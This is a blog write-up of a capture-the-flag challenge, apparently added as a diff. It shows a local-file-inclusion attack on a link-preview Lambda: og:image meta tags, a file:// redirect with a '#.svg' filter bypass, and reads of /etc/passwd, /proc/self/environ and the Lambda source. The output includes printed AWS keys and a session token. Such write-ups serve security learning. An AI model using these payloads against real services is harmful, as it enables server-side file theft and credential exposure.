@@ -1,0 +1,494 @@
+---
+title: BugPoC LFI CTF [Bonus - AWS Metadata & Source Code]
+date: '2020-10-06'
+---
+
+
+<!-- <img alt="BugPoC Logo" style={{margin: "40px auto 60px auto", display: "block", width: "140px"}} src="https://bugpoc.com/icons/bugpoc-small.png"/> -->
+
+This is my writeup for the LFI CTF organized by BugPoC at https://social.buggywebsite.com
+
+## Rules
+
+- Steal /etc/passwd
+
+- Bonus - Steal AWS Metadata and Source Code (at the end of this write-up) 
+
+
+#### PoC Collection
+
+Read on for more info, but here's the PoC's just in case you just want to see it in action, thanks to the BugPoC HTTP Repeater!
+
+| PoC | Link | Password |
+|-----|------|----------|
+| /etc/passwd | [bp-P68ladve](https://bugpoc.com/poc#bp-P68ladve) | tALlMOllY52 |
+| AWS Metadata | [bp-2N0JWe7y](https://bugpoc.com/poc#bp-2N0JWe7y) | wAnpEAcocK85 |
+| Source Code | [bp-r1FuWguz](https://bugpoc.com/poc#bp-r1FuWguz) | gOreMElON61 |
+
+
+## TL;DR
+
+- Exploit LFI via Redirecting to `/etc/passwd`
+- Get AWS Metadata from `/proc/self/environ`
+- Get Source code at `/var/task/lambda_function.py`
+
+Read on to know how I got it!
+
+## Walkthrough
+
+When you visit the page you'll see this page, which would allow you to share things to some social media platforms.
+
+<Image src="/static/images/bugpoc-lfi-ctf/app.png" width={427} height={369} alt="App"/>
+
+What I first did was look at the JavaScript file, which is `script.min.js`, since I've already used BugPoC, I knew a little how they write their code, and they didn't minify the code much which made it easier to read.
+
+Instead of showing the code, I'll tell you the things it does, which led me to find the vulnerability, since it's all happening in the backend.
+
+When you start typing into the text box, you'll see:
+
+- Multiple buttons pop up as you type, which are links to share what your wrote to some social media platforms, which didn't feel like a place to perform LFI.  Not so important.
+
+
+<video autoPlay muted>
+  <source src="/static/images/bugpoc-lfi-ctf/app-network.mp4" type="video/mp4"/>
+  Video of App network requests
+</video>
+
+
+- Any URL that begins with `https?://` is grabbed and a POST request with the URL is sent to `https://api.buggywebsite.com/website-preview`. **Important!**.
+
+So I just tried entering their URL itself.
+
+The request would look like:
+
+```http
+POST /website-preview HTTP/1.1
+Host: api.buggywebsite.com
+Connection: close
+Content-Length: 68
+Content-Type: application/json
+Accept: application/json
+
+{"url":"http://social.buggywebsite.com","requestTime":1601872536277}
+```
+
+In response you'll get JSON data scraped from the page, along with an image. The actual response for the above request is pretty big, so I'll just show you the format of the JSON data.
+
+```json
+{
+  "title": "Buggy Social LFI Challenge",
+  "description": "LFI CTF Challenge with cash prizes! Brought to you by bugpoc.com. Submit solutions to hackerone.com/bugpoc.",
+  "requestTime": 1601872536277,
+  "domain": "social.buggywebsite.com",
+  "image": {
+    "content": "<a-huge-encoded-string-of-an-image>",
+    "encoded": true,
+    "mimetype": "image/jpeg"
+  }
+}
+```
+
+The `requestTime` parameter really doesn't matter as it accepts any number value, so no need to look at that.
+
+But where is this data coming from? Looking at the source of the page, it was clear it was scraping the data from the url's `og:*` meta tags:
+
+```html
+<meta property="og:title" content="Buggy Social LFI Challenge" />
+<meta property="og:description" content="LFI CTF Challenge with cash prizes! Brought to you by bugpoc.com. Submit solutions to hackerone.com/bugpoc." />
+<meta property="og:image" content="http://social.buggywebsite.com/ctf-info-img.jpg" />
+```
+
+The above data is being fetched back as the response. 
+On further inspection, it was clear the `og:*` properties were being fetched.
+
+Also, supported formats are: 
+- png
+- jpeg
+- gif
+- svg
+
+If you use SVG, it'll respond in clear text without encoding it, since SVG is simply text.
+
+So, I thought I got this now!
+
+I'll have to craft an HTML page with a meta tag with property `og:image` set to `file:///etc/passwd`, which the server will then fetch and respond back to me!
+
+You can create public frontend html pages on services like codepen, netlify, glitch etc. But BugPoC has this great tool called [`Mock Endpoint`](https://bugpoc.com/testers/other/mock), which lets you create custom endpoints which respond with what you want it to without the hassle of setting up a server!
+
+```html
+<html>
+<head>
+  <meta property="og:image" content="file:///etc/passwd">
+</head>
+</html>
+```
+
+Here's how it would look like in the Mock Endpoint builder:
+
+<Image src="/static/images/bugpoc-lfi-ctf/bugpoc/first_try.png" width={597} height={476} alt="Mock Builder"/>
+
+I set it up and sent the request!
+
+I got the response:
+
+```json
+{
+  "title": "",
+  "description": "",
+  "requestTime": 1601872536277,
+  "domain": "mock.bugpoc.ninja",
+  "image": {
+    "error": "Invalid Image URL"
+  }
+}
+```
+
+It didn't work!
+
+At this point, I was really confused, and I spent a few hours trying
+- XXE
+- ImageTragick
+
+And all of it went in vain! Tried all kinds of payloads, but nothing worked. I had almost given up and cooled off for a while, and later it hit me that I just have to redirect to /etc/passwd and fool the server to think it's an image.
+
+From the above response, I understood that it *really only accepts an image*!
+
+So I wanted to know how exactly does it check that it's an image, so I used [RequestBin](https://requestbin.com) and created an endpoint and set it as the image property.
+
+At first I just saw a `HEAD` request and nothing else, and the server responded `Invalid Image`. So I tried changing it's response to that of an image!
+
+So I changed it's `Content-Type` header:
+
+```http
+Content-Type: image/svg+xml
+```
+
+Now firing the `web-preview` endpoint got me a GET request as well, and response of the requestbin endpoint was reflected back!
+
+<Image src="/static/images/bugpoc-lfi-ctf/requestbin.png" alt="RequestBin" width={576} height={286}/>
+
+So, it was clear now that all I had to do was to manipulate the response to *think that it's an image*, but it actually redirects to `file:///etc/passwd`.
+
+So, what I had actually done was create my own [express](https://expressjs.com) server on [glitch](https://glitch.com), which required a little bit of coding, but there is an easier way with BugPoC!
+
+Create a 301/302 redirect endpoint with Content-Type header set to that of an svg image, redirecting to `file:///etc/passwd`.
+
+```json
+{
+  "Content-Type": "image/svg+xml",
+  "Location": "file:///etc/passwd"
+}
+```
+
+
+<Image src="/static/images/bugpoc-lfi-ctf/bugpoc/redirect.png" alt="BugPoC Redirect" width={597} height={459}/>
+
+Click `Create` and use that URL in another Mock endpoint similar to which we created earlier and add it to the `og:image` property.
+
+Send it and you'll get an... Error!
+The error would say that it's still not a valid URL.
+
+So, to bypass it, just append `#.svg` to the link for the server to think it's an image, so the final URL would look like:
+
+```diff
+- <meta property="og:image" content="https://mock.bugpoc.ninja/9d8e6841-ba9d-4a6b-8801-ac457ec8d325/m?sig=8248a53fc5f83513f40c818397d1c64b3106e1ef5dcb572000f4f098d434d45b&statusCode=302&headers=%7B%22Content-Type%22%3A%22image%2Fsvg%2Bxml%22%2C%22Location%22%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%7D">
++ <meta property="og:image" content="https://mock.bugpoc.ninja/9d8e6841-ba9d-4a6b-8801-ac457ec8d325/m?sig=8248a53fc5f83513f40c818397d1c64b3106e1ef5dcb572000f4f098d434d45b&statusCode=302&headers=%7B%22Content-Type%22%3A%22image%2Fsvg%2Bxml%22%2C%22Location%22%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%7D#.svg">
+```
+
+Now, change this in your HTML page endpoint and send the request and you'll get the response!
+
+Here's the final BugPoC PoC, test it out!
+
+| Link | Password |
+|------|----------|
+| [https://bugpoc.com/poc#bp-P68ladve](https://bugpoc.com/poc#bp-P68ladve) | tALlMOllY52 |
+
+And now, you'll get the response with the /etc/passwd included!
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 8816
+Connection: close
+Date: Tue, 06 Oct 2020 06:33:08 GMT
+access-control-allow-origin: *
+X-Cache: Miss from cloudfront
+
+{
+    "title": "",
+    "description": "",
+    "requestTime": 1601569321664,
+    "domain": "mock.bugpoc.ninja",
+    "image": {
+        "content": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nlibstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\nec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nchrony:x:997:995::/var/lib/chrony:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash\nslicer:x:996:993::/tmp:/sbin/nologin\nsb_logger:x:995:992::/tmp:/sbin/nologin\nsbx_user1051:x:994:991::/home/sbx_user1051:/sbin/nologin\nsbx_user1052:x:993:990::/home/sbx_user1052:/sbin/nologin\nsbx_user1053:x:992:989::/home/sbx_user1053:/sbin/nologin\nsbx_user1054:x:991:988::/home/sbx_user1054:/sbin/nologin\nsbx_user1055:x:990:987::/home/sbx_user1055:/sbin/nologin\nsbx_user1056:x:989:986::/home/sbx_user1056:/sbin/nologin\nsbx_user1057:x:988:985::/home/sbx_user1057:/sbin/nologin\nsbx_user1058:x:987:984::/home/sbx_user1058:/sbin/nologin\nsbx_user1059:x:986:983::/home/sbx_user1059:/sbin/nologin\nsbx_user1060:x:985:982::/home/sbx_user1060:/sbin/nologin\nsbx_user1061:x:984:981::/home/sbx_user1061:/sbin/nologin\nsbx_user1062:x:983:980::/home/sbx_user1062:/sbin/nologin\nsbx_user1063:x:982:979::/home/sbx_user1063:/sbin/nologin\nsbx_user1064:x:981:978::/home/sbx_user1064:/sbin/nologin\nsbx_user1065:x:980:977::/home/sbx_user1065:/sbin/nologin\nsbx_user1066:x:979:976::/home/sbx_user1066:/sbin/nologin\nsbx_user1067:x:978:975::/home/sbx_user1067:/sbin/nologin\nsbx_user1068:x:977:974::/home/sbx_user1068:/sbin/nologin\nsbx_user1069:x:976:973::/home/sbx_user1069:/sbin/nologin\nsbx_user1070:x:975:972::/home/sbx_user1070:/sbin/nologin\nsbx_user1071:x:974:971::/home/sbx_user1071:/sbin/nologin\nsbx_user1072:x:973:970::/home/sbx_user1072:/sbin/nologin\nsbx_user1073:x:972:969::/home/sbx_user1073:/sbin/nologin\nsbx_user1074:x:971:968::/home/sbx_user1074:/sbin/nologin\nsbx_user1075:x:970:967::/home/sbx_user1075:/sbin/nologin\nsbx_user1076:x:969:966::/home/sbx_user1076:/sbin/nologin\nsbx_user1077:x:968:965::/home/sbx_user1077:/sbin/nologin\nsbx_user1078:x:967:964::/home/sbx_user1078:/sbin/nologin\nsbx_user1079:x:966:963::/home/sbx_user1079:/sbin/nologin\nsbx_user1080:x:965:962::/home/sbx_user1080:/sbin/nologin\nsbx_user1081:x:964:961::/home/sbx_user1081:/sbin/nologin\nsbx_user1082:x:963:960::/home/sbx_user1082:/sbin/nologin\nsbx_user1083:x:962:959::/home/sbx_user1083:/sbin/nologin\nsbx_user1084:x:961:958::/home/sbx_user1084:/sbin/nologin\nsbx_user1085:x:960:957::/home/sbx_user1085:/sbin/nologin\nsbx_user1086:x:959:956::/home/sbx_user1086:/sbin/nologin\nsbx_user1087:x:958:955::/home/sbx_user1087:/sbin/nologin\nsbx_user1088:x:957:954::/home/sbx_user1088:/sbin/nologin\nsbx_user1089:x:956:953::/home/sbx_user1089:/sbin/nologin\nsbx_user1090:x:955:952::/home/sbx_user1090:/sbin/nologin\nsbx_user1091:x:954:951::/home/sbx_user1091:/sbin/nologin\nsbx_user1092:x:953:950::/home/sbx_user1092:/sbin/nologin\nsbx_user1093:x:952:949::/home/sbx_user1093:/sbin/nologin\nsbx_user1094:x:951:948::/home/sbx_user1094:/sbin/nologin\nsbx_user1095:x:950:947::/home/sbx_user1095:/sbin/nologin\nsbx_user1096:x:949:946::/home/sbx_user1096:/sbin/nologin\nsbx_user1097:x:948:945::/home/sbx_user1097:/sbin/nologin\nsbx_user1098:x:947:944::/home/sbx_user1098:/sbin/nologin\nsbx_user1099:x:946:943::/home/sbx_user1099:/sbin/nologin\nsbx_user1100:x:945:942::/home/sbx_user1100:/sbin/nologin\nsbx_user1101:x:944:941::/home/sbx_user1101:/sbin/nologin\nsbx_user1102:x:943:940::/home/sbx_user1102:/sbin/nologin\nsbx_user1103:x:942:939::/home/sbx_user1103:/sbin/nologin\nsbx_user1104:x:941:938::/home/sbx_user1104:/sbin/nologin\nsbx_user1105:x:940:937::/home/sbx_user1105:/sbin/nologin\nsbx_user1106:x:939:936::/home/sbx_user1106:/sbin/nologin\nsbx_user1107:x:938:935::/home/sbx_user1107:/sbin/nologin\nsbx_user1108:x:937:934::/home/sbx_user1108:/sbin/nologin\nsbx_user1109:x:936:933::/home/sbx_user1109:/sbin/nologin\nsbx_user1110:x:935:932::/home/sbx_user1110:/sbin/nologin\nsbx_user1111:x:934:931::/home/sbx_user1111:/sbin/nologin\nsbx_user1112:x:933:930::/home/sbx_user1112:/sbin/nologin\nsbx_user1113:x:932:929::/home/sbx_user1113:/sbin/nologin\nsbx_user1114:x:931:928::/home/sbx_user1114:/sbin/nologin\nsbx_user1115:x:930:927::/home/sbx_user1115:/sbin/nologin\nsbx_user1116:x:929:926::/home/sbx_user1116:/sbin/nologin\nsbx_user1117:x:928:925::/home/sbx_user1117:/sbin/nologin\nsbx_user1118:x:927:924::/home/sbx_user1118:/sbin/nologin\nsbx_user1119:x:926:923::/home/sbx_user1119:/sbin/nologin\nsbx_user1120:x:925:922::/home/sbx_user1120:/sbin/nologin\nsbx_user1121:x:924:921::/home/sbx_user1121:/sbin/nologin\nsbx_user1122:x:923:920::/home/sbx_user1122:/sbin/nologin\nsbx_user1123:x:922:919::/home/sbx_user1123:/sbin/nologin\nsbx_user1124:x:921:918::/home/sbx_user1124:/sbin/nologin\nsbx_user1125:x:920:917::/home/sbx_user1125:/sbin/nologin\nsbx_user1126:x:919:916::/home/sbx_user1126:/sbin/nologin\nsbx_user1127:x:918:915::/home/sbx_user1127:/sbin/nologin\nsbx_user1128:x:917:914::/home/sbx_user1128:/sbin/nologin\nsbx_user1129:x:916:913::/home/sbx_user1129:/sbin/nologin\nsbx_user1130:x:915:912::/home/sbx_user1130:/sbin/nologin\nsbx_user1131:x:914:911::/home/sbx_user1131:/sbin/nologin\nsbx_user1132:x:913:910::/home/sbx_user1132:/sbin/nologin\nsbx_user1133:x:912:909::/home/sbx_user1133:/sbin/nologin\nsbx_user1134:x:911:908::/home/sbx_user1134:/sbin/nologin\nsbx_user1135:x:910:907::/home/sbx_user1135:/sbin/nologin\nsbx_user1136:x:909:906::/home/sbx_user1136:/sbin/nologin\nsbx_user1137:x:908:905::/home/sbx_user1137:/sbin/nologin\nsbx_user1138:x:907:904::/home/sbx_user1138:/sbin/nologin\nsbx_user1139:x:906:903::/home/sbx_user1139:/sbin/nologin\nsbx_user1140:x:905:902::/home/sbx_user1140:/sbin/nologin\nsbx_user1141:x:904:901::/home/sbx_user1141:/sbin/nologin\nsbx_user1142:x:903:900::/home/sbx_user1142:/sbin/nologin\nsbx_user1143:x:902:899::/home/sbx_user1143:/sbin/nologin\nsbx_user1144:x:901:898::/home/sbx_user1144:/sbin/nologin\nsbx_user1145:x:900:897::/home/sbx_user1145:/sbin/nologin\nsbx_user1146:x:899:896::/home/sbx_user1146:/sbin/nologin\nsbx_user1147:x:898:895::/home/sbx_user1147:/sbin/nologin\nsbx_user1148:x:897:894::/home/sbx_user1148:/sbin/nologin\nsbx_user1149:x:896:893::/home/sbx_user1149:/sbin/nologin\nsbx_user1150:x:895:892::/home/sbx_user1150:/sbin/nologin\nsbx_user1151:x:894:891::/home/sbx_user1151:/sbin/nologin\nsbx_user1152:x:893:890::/home/sbx_user1152:/sbin/nologin\nsbx_user1153:x:892:889::/home/sbx_user1153:/sbin/nologin\nsbx_user1154:x:891:888::/home/sbx_user1154:/sbin/nologin\nsbx_user1155:x:890:887::/home/sbx_user1155:/sbin/nologin\nsbx_user1156:x:889:886::/home/sbx_user1156:/sbin/nologin\nsbx_user1157:x:888:885::/home/sbx_user1157:/sbin/nologin\nsbx_user1158:x:887:884::/home/sbx_user1158:/sbin/nologin\nsbx_user1159:x:886:883::/home/sbx_user1159:/sbin/nologin\nsbx_user1160:x:885:882::/home/sbx_user1160:/sbin/nologin\nsbx_user1161:x:884:881::/home/sbx_user1161:/sbin/nologin\nsbx_user1162:x:883:880::/home/sbx_user1162:/sbin/nologin\nsbx_user1163:x:882:879::/home/sbx_user1163:/sbin/nologin\nsbx_user1164:x:881:878::/home/sbx_user1164:/sbin/nologin\nsbx_user1165:x:880:877::/home/sbx_user1165:/sbin/nologin\nsbx_user1166:x:879:876::/home/sbx_user1166:/sbin/nologin\nsbx_user1167:x:878:875::/home/sbx_user1167:/sbin/nologin\nsbx_user1168:x:877:874::/home/sbx_user1168:/sbin/nologin\nsbx_user1169:x:876:873::/home/sbx_user1169:/sbin/nologin\nsbx_user1170:x:875:872::/home/sbx_user1170:/sbin/nologin\nsbx_user1171:x:874:871::/home/sbx_user1171:/sbin/nologin\nsbx_user1172:x:873:870::/home/sbx_user1172:/sbin/nologin\nsbx_user1173:x:872:869::/home/sbx_user1173:/sbin/nologin\nsbx_user1174:x:871:868::/home/sbx_user1174:/sbin/nologin\nsbx_user1175:x:870:867::/home/sbx_user1175:/sbin/nologin\nsbx_user1176:x:869:866::/home/sbx_user1176:/sbin/nologin\n",
+        "encoded": false,
+        "mimetype": "image/svg+xml"
+    }
+}
+```
+
+Finally!
+
+So, there you have it! LFI!
+
+
+# Bonus - AWS Metadata & Source Code
+
+## AWS Metadata
+
+Just as everyone would, I first tried setting the og:image property to `http://169.254.169.254/latest/meta-data`, but it didn't work.
+
+I tried for a long time checking out all kinds of SSRF bypasses to this, but it hit me, the meta data is also stored in the server environment variables, but is there a way to fetch it without running a command such as `env`, or any way of fetching it with the help of files?
+
+There is!
+
+Which is accessing `file:///proc/self/environ`
+
+| Link | Password |
+|------|----------|
+| [bp-2N0JWe7y](https://bugpoc.com/poc#bp-2N0JWe7y) | wAnpEAcocK85 |
+
+
+
+If you access it you'll get the following in response, which I've cleaned and prettified over here.
+
+```bash
+AWS_LAMBDA_FUNCTION_VERSION=$LATEST
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEL///////////wEaCXVzLXdlc3QtMiJHMEUCIQDKcHrf+a1to9LzpIhW0bOZnBEANhB1rVN2CrHKkjo+AAIgH0qY+OpTm1puAQjjWWtDpKEjTuklixxQMYLrT0yu8XAq2wEI6P//////////ARABGgwwMTA1NDQ0MzkyMTAiDH+MCunkr2mnaYAz/CqvAbWxkZCqMojKQgqqHFrrcncSBbj70YfaOkID5wP7zR0c2WUr8SeLfw4LoZvWJHmPwyu7tI97LpFXrEjAo4csda7MCqqDCJvN9Nk8VU4bCr7xHVCFCiyDZEtZI8bmelqWDJrKFQ4Te8fNy5ZiRAjCMBp98AZPCMxkePZh7/grgzal7LEGiYlMbQ/joX6rxVp3fC4LZaMpMX/wql5QKltQjcSdjO8+MtXJgmc2+7cIYH4wxK3w+wU64AFC3fPvhOh0fQh84uCg+TwaYOmLBAorH/imr1QBYlW/XbiJuc0FLsXyMBUaCV2rT8EozZqtJpykd3/+r1G9EQNdldtMqXkEYu2JV8hx2DFBzZXjxvcdqoZZ0f7v85VOvDYdF3m6Bbn+P3R791a+JxGKn7zNUjFLttL5xmuD2Lxj/udeVXZW7JQHvZSYiuTAiOruv7r2ukKEcWfCHcz4NXs4LoOn/5Gbsj1N+rcb5rEbnuNTEpdGwMF3vqy8WarGWMX6ROs1rptvpSiQ9pGo8U/yjJyib0ziz/JwGkItvCpUrQ==
+LAMBDA_TASK_ROOT=/var/task
+AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/get-website-preview
+LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
+AWS_LAMBDA_LOG_STREAM_NAME=2020/10/06/[$LATEST]86a1afac5722406fbadb8732ea2a57ff
+AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
+AWS_EXECUTION_ENV=AWS_Lambda_python3.8
+AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
+AWS_LAMBDA_FUNCTION_NAME=get-website-preview
+PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
+AWS_DEFAULT_REGION=us-west-2
+PWD=/var/task
+AWS_SECRET_ACCESS_KEY=DIH3850Wrm/o+/LVaZnY3y576F3nBvRSmD0VUvNB
+LANG=en_US.UTF-8
+LAMBDA_RUNTIME_DIR=/var/runtime
+AWS_REGION=us-west-2
+TZ=:UTC
+AWS_ACCESS_KEY_ID=ASIAQE5D7L6VARFVLL4J
+SHLVL=0
+_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
+_AWS_XRAY_DAEMON_PORT=2000
+_LAMBDA_TELEMETRY_LOG_FD=3
+AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
+_HANDLER=lambda_function.lambda_handler
+AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512
+```
+
+> I have asked for their permission to publish this and the source code. Although you wouldn't find anything with the AWS metadata because there's no permissions linked.
+
+
+Looking at this, it's clear that it's an AWS Lambda Instance and we have access to the metadata, which seems useless, but is it? :wink:
+
+Now half the work here is done! We have the metadata, but what about the source code?
+
+## Source Code
+
+Well, at first I thought it would be very tedious and time consuming to manually brute force directories and files by changing the mock page content each time.
+
+But then it hit me, I've researched a bit on their Python PoC generator as well, and what I found was that it was also using a Lambda Instance and I knew how it worked.
+
+But then again, if you look at the meta data from `environ`, the path is already there!
+
+In the environment variables we fetched, we see:
+
+```bash
+AWS_EXECUTION_ENV=AWS_Lambda_python3.8
+LAMBDA_TASK_ROOT=/var/task
+HANDLER=lambda_function.lambda_handler
+```
+
+This means it's hosting a `python` application, with it's source code in `/var/task` and it's filename is `lambda_function` and the Lambda handler function is `lambda_handler`.
+
+So I changed the image meta tag content to `file:///var/task/lambda_function.py` and there it was, the whole source code was returned in the response!
+
+| Link | Password |
+|------|----------|
+| [bp-r1FuWguz](https://bugpoc.com/poc#bp-r1FuWguz) | gOreMElON61 |
+
+
+Here's the prettified code:
+
+```py
+import json
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+import fleep
+import base64
+import os
+import sys
+from urllib.request import url2pathname
+
+class LocalFileAdapter(requests.adapters.BaseAdapter):
+    """Protocol Adapter to allow Requests to GET file:// URLs
+
+    @todo: Properly handle non-empty hostname portions.
+    """
+
+    @staticmethod
+    def _chkpath(method, path):
+        """Return an HTTP status for the given filesystem path."""
+        if method.lower() in ('put', 'delete'):
+            return 501, "Not Implemented"  # TODO
+        elif method.lower() not in ('get', 'head'):
+            return 405, "Method Not Allowed"
+        elif os.path.isdir(path):
+            return 400, "Path Not A File"
+        elif not os.path.isfile(path):
+            return 404, "File Not Found"
+        elif not os.access(path, os.R_OK):
+            return 403, "Access Denied"
+        else:
+            return 200, "OK"
+
+    def send(self, req, **kwargs):
+        # pylint: disable=unused-argument
+        """Return the file specified by the given request
+
+        @type req: C{PreparedRequest}
+        @todo: Should I bother filling `response.headers` and processing
+               If-Modified-Since and friends using `os.stat`?
+        """
+        path = os.path.normcase(os.path.normpath(url2pathname(req.path_url)))
+        response = requests.Response()
+
+        response.status_code, response.reason = self._chkpath(req.method, path)
+        if response.status_code == 200 and req.method.lower() != 'head':
+            try:
+                response.raw = open(path, 'rb')
+            except (OSError, IOError) as err:
+                response.status_code = 500
+                response.reason = str(err)
+
+        if isinstance(req.url, bytes):
+            response.url = req.url.decode('utf-8')
+        else:
+            response.url = req.url
+
+        response.request = req
+        response.connection = self
+
+        return response
+
+    def close(self):
+        pass
+
+def get_og(url):
+    r = requests.get(url,headers={'user-agent':'Buggybot/1.0'})
+    soup = BeautifulSoup(r.text, 'html.parser')
+    metas = soup.find_all('meta', attrs={"property":True})
+    ogs = {meta['property']:meta['content'] for meta in metas if meta['property'].startswith('og:')}
+    return {
+        'title':ogs.get('og:title',''),
+        'description':ogs.get('og:description',''),
+        'image_url':ogs.get('og:image',''),
+    }
+
+def get_image_bytes(image_url):
+    # set up requests session like stack overflow told me to
+    requests_session = requests.session()
+    requests_session.mount('file://', LocalFileAdapter())
+    # verify the thing we are about to download is an image
+    r_head = requests_session.head(image_url, stream=True, headers={'user-agent':'Buggybot/1.0'})
+    if not ('image' in r_head.headers.get('Content-Type') or 'image' in r_head.headers.get('content-type')):
+        raise Exception("Image Failed HEAD Test")
+    # download thing
+    r = requests_session.get(image_url, stream=True, headers={'user-agent':'Buggybot/1.0'})
+    img = r.content
+    return img
+
+def get_image_mimetype(image_bytes):
+    f = fleep.get(image_bytes)
+    if len(f.mime) > 0:
+        return f.mime[0]
+    else:
+        return ''
+    
+valid_image_extensions = ['.jpg','.png','.gif','.svg']
+def get_image_content(image_url):
+    # verify the url has an acceptable extension
+    has_valid_extension = any([ext in image_url for ext in valid_image_extensions])
+    # verify the url starts with http
+    if image_url.startswith('http') and has_valid_extension:
+        # download the image content
+        image_bytes = get_image_bytes(image_url)
+        if image_bytes == None:
+            raise Exception('Not Found')
+        # check file magic bytes
+        mimetype = get_image_mimetype(image_bytes)
+        if '.jpg' in image_url and mimetype == 'image/jpeg':
+            return (base64.b64encode(image_bytes),True,mimetype)
+        elif '.png' in image_url and mimetype == 'image/png':
+            return (base64.b64encode(image_bytes),True,mimetype)
+        elif '.gif' in image_url and mimetype == 'image/gif':
+            return (base64.b64encode(image_bytes),True,mimetype)
+        elif '.svg' in image_url:
+            # svg is basically a text file. no need to look at magic bytes
+            return (image_bytes ,False,'image/svg+xml')
+        else:
+            raise Exception('Unable to Process Image')
+    else:
+        raise Exception('Invalid Image URL')
+    
+def lambda_handler(event, context):
+
+    try:
+        # get url from request
+        body = event.get('body','')
+        json_body = json.loads(body)
+        url = json_body['url']
+        
+        # get the request time
+        request_time = int(json_body['requestTime'])
+        
+        # get open graph data
+        og_data = get_og(url)
+        
+        # add the request time
+        og_data['requestTime'] = request_time;
+        
+        # add parsed domain
+        og_data['domain'] = urlparse(url).netloc
+        
+        if og_data['image_url'] != '':
+            try:
+                # attempt to download the image content
+                (img,needed_encoding,mimetype) = get_image_content(og_data['image_url'])
+                img_json = {
+                    'content' : img.decode(),
+                    'encoded' : needed_encoding,
+                    'mimetype' : mimetype
+                }
+                og_data['image'] = img_json
+            except Exception as e:
+                og_data['image'] = {'error':str(e)}
+                
+        # remove the og:image
+        del og_data['image_url']
+        
+        return {
+            'statusCode': 200,
+            'body': json.dumps(og_data),
+            'headers': {'access-control-allow-origin': '*'}
+        }
+    except Exception as e:
+        return {
+            'statusCode': 400,
+            'body':'Error, unable to fetch website preview',
+            'headers': {'access-control-allow-origin': '*'}
+        }
+
+```
+
+Well now we know how it all works!
+
+If you still have any doubts, just read the source code!
+
+Hope you had a nice time reading this.
